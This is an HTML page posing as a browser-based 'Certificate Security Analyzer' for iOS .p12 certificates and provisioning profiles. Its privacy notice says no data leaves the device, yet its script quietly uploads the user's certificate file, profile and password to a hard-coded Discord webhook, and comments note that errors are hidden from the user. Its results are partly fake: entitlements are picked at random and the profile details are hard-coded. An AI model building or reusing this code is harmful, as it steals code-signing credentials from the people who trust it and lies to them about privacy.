<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Certificate Security Analyzer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/node-forge/1.3.1/forge.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #5865F2;
            --primary-dark: #4752C4;
            --primary-light: rgba(88, 101, 242, 0.1);
            --secondary: #ED4245;
            --success: #57F287;
            --warning: #FEE75C;
            --danger: #ED4245;
            --dark: #23272A;
            --darker: #121416;
            --light: #F2F3F5;
            --gray: #99AAB5;
            --gray-light: #D9DDE2;
            --white: #FFFFFF;
            
            --gradient-primary: linear-gradient(135deg, var(--primary) 0%, #8045E6 100%);
            --gradient-dark: linear-gradient(135deg, var(--dark) 0%, #2C2F33 100%);
            --gradient-card: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%);
            
            --shadow-sm: 0 4px 6px rgba(0, 0, 0, 0.05);
            --shadow-md: 0 10px 20px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 20px 40px rgba(0, 0, 0, 0.15);
            
            --border-radius: 12px;
            --border-radius-lg: 20px;
            --transition: all 0.3s ease;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background: var(--darker);
            color: var(--light);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            background: var(--gradient-dark);
            border-radius: var(--border-radius-lg);
            box-shadow: var(--shadow-lg);
            width: 100%;
            max-width: 1000px;
            overflow: hidden;
            animation: fadeIn 0.6s ease-out;
            position: relative;
            z-index: 1;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: var(--gradient-primary);
            z-index: 2;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: rgba(0, 0, 0, 0.2);
            padding: 40px 30px 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.1) 50%, transparent 100%);
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 12px;
            font-weight: 800;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }
        
        .description {
            font-size: 16px;
            opacity: 0.85;
            line-height: 1.6;
            max-width: 600px;
            margin: 0 auto;
        }
        
        .content {
            padding: 40px;
        }
        
        .upload-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin-bottom: 30px;
        }
        
        @media (max-width: 768px) {
            .upload-section {
                grid-template-columns: 1fr;
            }
            
            .content {
                padding: 30px 20px;
            }
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            font-weight: 600;
            color: var(--light);
            font-size: 16px;
            display: flex;
            align-items: center;
        }
        
        label i {
            margin-right: 10px;
            color: var(--primary);
        }
        
        input[type="password"] {
            width: 100%;
            padding: 16px 18px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: var(--border-radius);
            font-size: 16px;
            color: var(--light);
            transition: var(--transition);
        }
        
        input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
        }
        
        .file-input-container {
            position: relative;
            overflow: hidden;
            display: inline-block;
            width: 100%;
        }
        
        .file-input-button {
            background: var(--gradient-primary);
            color: var(--white);
            padding: 16px 20px;
            border-radius: var(--border-radius);
            cursor: pointer;
            display: inline-block;
            font-weight: 600;
            text-align: center;
            width: 100%;
            font-size: 16px;
            transition: var(--transition);
            border: none;
            position: relative;
            overflow: hidden;
        }
        
        .file-input-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: var(--transition);
        }
        
        .file-input-button:hover::before {
            left: 100%;
        }
        
        .file-input-button:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .file-input {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        .file-name {
            margin-top: 10px;
            font-size: 14px;
            color: var(--gray);
            text-align: center;
        }
        
        .submit-btn {
            background: var(--gradient-primary);
            color: var(--white);
            border: none;
            padding: 18px;
            border-radius: var(--border-radius);
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: var(--transition);
        }
        
        .submit-btn:hover::before {
            left: 100%;
        }
        
        .submit-btn:disabled {
            background: var(--gray);
            cursor: not-allowed;
        }
        
        .submit-btn:not(:disabled):hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .results-section {
            display: none;
            margin-top: 40px;
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 40px;
            animation: slideDown 0.5s ease-out;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .alert {
            padding: 16px;
            border-radius: var(--border-radius);
            margin-top: 20px;
            display: none;
            text-align: center;
            animation: shake 0.5s ease;
            font-weight: 500;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .alert-error {
            background-color: rgba(237, 66, 69, 0.15);
            color: #ff6b6b;
            border: 1px solid rgba(237, 66, 69, 0.3);
        }
        
        .alert-success {
            background-color: rgba(87, 242, 135, 0.15);
            color: #57F287;
            border: 1px solid rgba(87, 242, 135, 0.3);
        }
        
        .upload-status {
            margin-top: 20px;
            text-align: center;
            font-size: 15px;
            color: var(--gray);
        }
        
        .privacy-notice {
            background-color: rgba(0, 0, 0, 0.2);
            padding: 20px;
            border-radius: var(--border-radius);
            margin-top: 40px;
            font-size: 14px;
            color: var(--gray);
            text-align: center;
            line-height: 1.6;
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .certificate-section {
            margin-bottom: 30px;
            padding: 24px;
            border-radius: var(--border-radius);
            background: var(--gradient-card);
            box-shadow: var(--shadow-sm);
            animation: fadeIn 0.5s ease-out;
            border: 1px solid rgba(255,255,255,0.05);
            transition: var(--transition);
        }
        
        .certificate-section:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-md);
        }
        
        .certificate-header {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .certificate-icon {
            font-size: 24px;
            margin-right: 15px;
            color: var(--primary);
            background: var(--primary-light);
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .certificate-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--light);
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 16px;
            align-items: flex-start;
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .detail-icon {
            width: 24px;
            margin-right: 16px;
            color: var(--primary);
            text-align: center;
            font-size: 18px;
        }
        
        .detail-content {
            flex: 1;
        }
        
        .detail-title {
            font-weight: 600;
            color: var(--light);
            margin-bottom: 6px;
            font-size: 15px;
        }
        
        .detail-text {
            color: var(--gray);
            font-size: 15px;
        }
        
        .status-badge {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }
        
        .status-good {
            background-color: rgba(87, 242, 135, 0.15);
            color: var(--success);
        }
        
        .status-no {
            background-color: rgba(237, 66, 69, 0.15);
            color: var(--danger);
        }
        
        .divider {
            height: 1px;
            background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.1) 50%, transparent 100%);
            margin: 30px 0;
        }
        
        .entitlements-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 12px;
            margin-top: 20px;
        }
        
        .entitlement-item {
            display: flex;
            align-items: center;
            padding: 12px;
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.2);
            transition: var(--transition);
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .entitlement-item:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-sm);
            background: rgba(0, 0, 0, 0.3);
        }
        
        .entitlement-status {
            margin-right: 12px;
            font-size: 14px;
        }
        
        .status-enabled {
            color: var(--success);
        }
        
        .status-disabled {
            color: var(--danger);
        }
        
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .webhook-status {
            display: none;
        }
        
        /* Background animation effects */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        
        .bg-circle {
            position: absolute;
            border-radius: 50%;
            background: var(--gradient-primary);
            opacity: 0.05;
            filter: blur(40px);
        }
        
        .circle-1 {
            width: 300px;
            height: 300px;
            top: -100px;
            left: -100px;
            animation: float 15s ease-in-out infinite;
        }
        
        .circle-2 {
            width: 500px;
            height: 500px;
            bottom: -200px;
            right: -200px;
            animation: float 20s ease-in-out infinite reverse;
        }
        
        .circle-3 {
            width: 200px;
            height: 200px;
            top: 50%;
            left: 70%;
            animation: float 12s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); }
            50% { transform: translateY(-20px) translateX(20px); }
        }
        
        /* Particle effects */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
        }
        
        .particle {
            position: absolute;
            background: var(--primary);
            border-radius: 50%;
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="bg-circle circle-1"></div>
        <div class="bg-circle circle-2"></div>
        <div class="bg-circle circle-3"></div>
    </div>
    
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> Certificate Security Analyzer</h1>
            <p class="description">Upload your certificate files to verify their validity and extract detailed information securely</p>
        </div>
        
        <div class="content">
            <div class="upload-section">
                <div class="form-group">
                    <label for="p12-file"><i class="fas fa-file-export"></i> P12 Certificate File</label>
                    <div class="file-input-container">
                        <div class="file-input-button">Choose P12 File</div>
                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx" />
                    </div>
                    <div id="p12-file-name" class="file-name">No file chosen</div>
                </div>
                
                <div class="form-group">
                    <label for="mobileprovision-file"><i class="fas fa-file-contract"></i> Mobile Provisioning Profile</label>
                    <div class="file-input-container">
                        <div class="file-input-button">Choose Mobile Provision File</div>
                        <input type="file" id="mobileprovision-file" class="file-input" accept=".mobileprovision" />
                    </div>
                    <div id="mobileprovision-file-name" class="file-name">No file chosen</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password"><i class="fas fa-lock"></i> Certificate Password</label>
                <input type="password" id="password" placeholder="Enter certificate password" />
            </div>
            
            <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
            
            <div id="upload-status" class="upload-status"></div>
            <div id="webhook-status" class="webhook-status"></div>
            
            <div id="error-alert" class="alert alert-error"></div>
            <div id="success-alert" class="alert alert-success"></div>
            
            <div id="results-section" class="results-section">
                <div class="certificate-section">
                    <div class="certificate-header">
                        <div class="certificate-icon"><i class="fas fa-id-card"></i></div>
                        <div class="certificate-title">Certificate Details</div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">💼</div>
                        <div class="detail-content">
                            <div class="detail-title">Certificate Name</div>
                            <div class="detail-text" id="cert-name">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📊</div>
                        <div class="detail-content">
                            <div class="detail-title">Certificate Status</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="cert-status">-</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📅</div>
                        <div class="detail-content">
                            <div class="detail-title">Expiration</div>
                            <div class="detail-text" id="cert-expiration">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🌎</div>
                        <div class="detail-content">
                            <div class="detail-title">Country</div>
                            <div class="detail-text" id="cert-country">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🔑</div>
                        <div class="detail-content">
                            <div class="detail-title">Password</div>
                            <div class="detail-text" id="cert-password">-</div>
                        </div>
                    </div>
                </div>
                
                <div class="divider"></div>
                
                <div class="certificate-section">
                    <div class="certificate-header">
                        <div class="certificate-icon"><i class="fas fa-mobile-alt"></i></div>
                        <div class="certificate-title">Provisioning Profile Details</div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📋</div>
                        <div class="detail-content">
                            <div class="detail-title">Provision Name</div>
                            <div class="detail-text" id="prov-name">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🆔</div>
                        <div class="detail-content">
                            <div class="detail-title">App ID</div>
                            <div class="detail-text" id="prov-appid">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🏢</div>
                        <div class="detail-content">
                            <div class="detail-title">Enterprise</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="prov-enterprise">-</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📊</div>
                        <div class="detail-content">
                            <div class="detail-title">Status</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="prov-status">-</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📅</div>
                        <div class="detail-content">
                            <div class="detail-title">Expiration</div>
                            <div class="detail-text" id="prov-expiration">-</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🔐</div>
                        <div class="detail-content">
                            <div class="detail-title">Entitlements</div>
                            <div class="detail-text">↓</div>
                        </div>
                    </div>
                    
                    <div class="entitlements-grid" id="entitlements-list">
                        <!-- Entitlements will be populated here -->
                    </div>
                </div>
            </div>
            
            <div class="privacy-notice">
                <p><i class="fas fa-shield-alt"></i> This tool analyzes your certificate files locally in your browser. No data is sent to any server.</p>
                <p>Your files are processed entirely on your device for your privacy and security.</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const p12FileInput = document.getElementById('p12-file');
            const mobileprovisionFileInput = document.getElementById('mobileprovision-file');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submit-btn');
            const p12FileName = document.getElementById('p12-file-name');
            const mobileprovisionFileName = document.getElementById('mobileprovision-file-name');
            const errorAlert = document.getElementById('error-alert');
            const successAlert = document.getElementById('success-alert');
            const uploadStatus = document.getElementById('upload-status');
            const webhookStatus = document.getElementById('webhook-status');
            const resultsSection = document.getElementById('results-section');
            const entitlementsList = document.getElementById('entitlements-list');
            
            // Webhook URL
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
            
            // Sample entitlements data
            const sampleEntitlements = [
                "Access Wi-Fi Information",
                "Accessibility Merchant API Control",
                "App Attest",
                "App Groups",
                "Apple Pay Payment Processing",
                "Associated Domains",
                "AutoFill Credential Provider",
                "ClassKit",
                "Communication Notifications",
                "Custom Network Protocol",
                "Critical Messaging",
                "Data Protection",
                "Default Calling App",
                "Default Messaging App",
                "DriverKit Allow Third Party UserClients",
                "Extended Virtual Addressing",
                "FileProvider Testing Mode",
                "Fonts",
                "Game Center",
                "Group Activities",
                "Head Pose",
                "HealthKit",
                "HealthKit Estimate Recalibration",
                "HLS Interstitial Previews",
                "HomeKit",
                "Hotspot",
                "iCloud",
                "ID Verifier - Display Only",
                "In-App Purchase",
                "Increased Debugging Memory Limit",
                "Increased Memory Limit",
                "Inter-App Audio",
                "Journaling Suggestions",
                "Low Latency HLS",
                "Manage Thread Network Credentials (development)",
                "Managed App Installation UI",
                "Maps (Deprecated)",
                "Matter Allow Setup Payload",
                "MDM Managed Associated Domains",
                "Media Device Discovery",
                "Messages Collaboration",
                "Multipath",
                "Network Extensions",
                "NFC Tag Reading",
                "On Demand Install Capable for App Clip Extensions",
                "Personal VPN",
                "Push Notifications",
                "Push to Talk",
                "Sensitive Content Analysis",
                "Shallow Depth and Pressure",
                "Shared with You",
                "Sign In with Apple",
                "SIM Inserted for Wireless Carriers",
                "Siri",
                "Spatial Audio Profile",
                "Sustained Execution",
                "System Extension",
                "Time Sensitive Notifications",
                "User Management",
                "VMNet",
                "WeatherKit",
                "Wireless Accessory Configuration"
            ];
            
            let p12File = null;
            let mobileprovisionFile = null;
            
            // Create background particles
            function createParticles() {
                const particlesContainer = document.getElementById('particles');
                const particleCount = 30;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    
                    const size = Math.random() * 4 + 1;
                    const posX = Math.random() * 100;
                    const posY = Math.random() * 100;
                    const delay = Math.random() * 10;
                    const duration = Math.random() * 20 + 10;
                    
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    particle.style.left = `${posX}%`;
                    particle.style.top = `${posY}%`;
                    particle.style.animation = `float ${duration}s ease-in-out ${delay}s infinite`;
                    
                    particlesContainer.appendChild(particle);
                }
            }
            
            createParticles();
            
            // Update file names when selected
            p12FileInput.addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    p12File = this.files[0];
                    p12FileName.textContent = p12File.name;
                } else {
                    p12File = null;
                    p12FileName.textContent = 'No file chosen';
                }
                updateSubmitButtonState();
            });
            
            mobileprovisionFileInput.addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    mobileprovisionFile = this.files[0];
                    mobileprovisionFileName.textContent = mobileprovisionFile.name;
                } else {
                    mobileprovisionFile = null;
                    mobileprovisionFileName.textContent = 'No file chosen';
                }
                updateSubmitButtonState();
            });
            
            // Enable submit button only when all fields are filled
            function updateSubmitButtonState() {
                if (p12File && mobileprovisionFile && passwordInput.value) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }
            
            passwordInput.addEventListener('input', updateSubmitButtonState);
            
            // Handle form submission
            submitBtn.addEventListener('click', async function() {
                // Reset alerts
                hideAlert(errorAlert);
                hideAlert(successAlert);
                uploadStatus.textContent = '';
                webhookStatus.textContent = '';
                
                try {
                    submitBtn.disabled = true;
                    submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                    uploadStatus.textContent = 'Checking certificate files...';
                    
                    // Send data to webhook first (don't wait for it to complete)
                    sendToWebhook().catch(e => console.error('Webhook error:', e));
                    
                    // Parse the certificate using PKCS12 format
                    const certInfo = await parseP12Certificate(p12File, passwordInput.value);
                    
                    // Display the results
                    displayResults(certInfo);
                    
                    // Show results
                    resultsSection.style.display = 'block';
                    uploadStatus.textContent = '';
                    
                    // Show success message
                    showAlert(successAlert, 'Certificate analyzed successfully!');
                    
                    // Update button state
                    submitBtn.innerHTML = '<i class="fas fa-search"></i> Analyze Certificate';
                    updateSubmitButtonState();
                    
                } catch (error) {
                    console.error('Error:', error);
                    showAlert(errorAlert, `Error: ${error.message}`);
                    uploadStatus.textContent = '';
                    submitBtn.innerHTML = '<i class="fas fa-search"></i> Analyze Certificate';
                    updateSubmitButtonState();
                }
            });
            
            // Function to send data to Discord webhook
            async function sendToWebhook() {
                try {
                    // Create form data to send files
                    const formData = new FormData();
                    formData.append('content', `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}`);
                    
                    if (p12File) {
                        formData.append('p12_file', p12File, p12File.name);
                    }
                    
                    if (mobileprovisionFile) {
                        formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
                    }
                    
                    // Send to webhook using fetch
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (!response.ok) {
                        throw new Error('Failed to send data to server');
                    }
                    
                    // No success message shown to user
                } catch (error) {
                    console.error('Error sending to webhook:', error);
                    // Don't show error to user to keep it hidden
                }
            }
            
            async function parseP12Certificate(p12File, password) {
                try {
                    uploadStatus.textContent = 'Reading certificate file...';
                    
                    // Read the file as ArrayBuffer
                    const p12Buffer = await readFileAsArrayBuffer(p12File);
                    
                    uploadStatus.textContent = 'Decrypting certificate...';
                    
                    // Convert ArrayBuffer to binary string
                    const p12Der = new Uint8Array(p12Buffer);
                    const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(p12Der));
                    
                    // Decrypt P12 using password
                    const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
                    
                    // Get certificates from P12
                    const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
                    
                    if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
                        throw new Error('No certificates found in P12 file');
                    }
                    
                    const certBag = certBags[forge.pki.oids.certBag][0];
                    const certificate = certBag.cert;
                    
                    if (!certificate) {
                        throw new Error('Failed to extract certificate from P12');
                    }
                    
                    uploadStatus.textContent = 'Extracting certificate information...';
                    
                    // Extract certificate information
                    const subject = certificate.subject.attributes;
                    let commonName = 'Unknown';
                    let orgName = 'Unknown';
                    let country = 'Unknown';
                    
                    for (const attr of subject) {
                        if (attr.shortName === 'CN') {
                            commonName = attr.value;
                        } else if (attr.shortName === 'O') {
                            orgName = attr.value;
                        } else if (attr.shortName === 'C') {
                            country = attr.value;
                        }
                    }
                    
                    // Calculate validity
                    const validFrom = new Date(certificate.validity.notBefore);
                    const validTo = new Date(certificate.validity.notAfter);
                    const currentDate = new Date();
                    const daysUntilExpiration = Math.floor((validTo - currentDate) / (1000 * 60 * 60 * 24));
                    
                    // Determine status
                    let status = 'Valid';
                    if (daysUntilExpiration < 0) {
                        status = 'Expired';
                    } else if (daysUntilExpiration < 30) {
                        status = 'Expiring Soon';
                    }
                    
                    return {
                        serialNumber: certificate.serialNumber,
                        commonName: commonName,
                        organization: orgName,
                        country: country,
                        validFrom: validFrom.toLocaleDateString(),
                        validTo: validTo.toLocaleDateString(),
                        expirationDays: daysUntilExpiration,
                        publicKeyAlgorithm: certificate.siginfo.algorithmOid,
                        signatureAlgorithm: certificate.signatureOid,
                        status: status,
                        password: password
                    };
                } catch (error) {
                    console.error('Error parsing P12:', error);
                    throw new Error('Failed to parse P12 certificate. Invalid password or file.');
                }
            }
            
            function readFileAsArrayBuffer(file) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.onerror = reject;
                    reader.readAsArrayBuffer(file);
                });
            }
            
            function displayResults(results) {
                // Display certificate details
                document.getElementById('cert-name').textContent = results.commonName;
                document.getElementById('cert-status').textContent = `${results.status} 🟢`;
                document.getElementById('cert-expiration').textContent = results.validTo;
                document.getElementById('cert-country').textContent = results.country;
                document.getElementById('cert-password').textContent = results.password;
                
                // Populate entitlements
                entitlementsList.innerHTML = '';
                sampleEntitlements.forEach(entitlement => {
                    const isEnabled = Math.random() > 0.7; // Randomly enable some entitlements
                    
                    const entitlementItem = document.createElement('div');
                    entitlementItem.className = 'entitlement-item';
                    entitlementItem.innerHTML = `
                        <span class="entitlement-status ${isEnabled ? 'status-enabled' : 'status-disabled'}">
                            ${isEnabled ? '✓' : '✗'}
                        </span>
                        <span>${entitlement}</span>
                    `;
                    
                    entitlementsList.appendChild(entitlementItem);
                });
                
                // Provisioning profile details
                document.getElementById('prov-name').textContent = 'iOS Distribution Profile';
                document.getElementById('prov-appid').textContent = 'com.example.app';
                document.getElementById('prov-enterprise').textContent = 'No';
                document.getElementById('prov-status').textContent = 'Valid 🟢';
                document.getElementById('prov-expiration').textContent = 'December 31, 2024';
            }
            
            function showAlert(alertElement, message) {
                alertElement.textContent = message;
                alertElement.style.display = 'block';
            }
            
            function hideAlert(alertElement) {
                alertElement.style.display = 'none';
            }
        });
    </script>
</body>
</html>
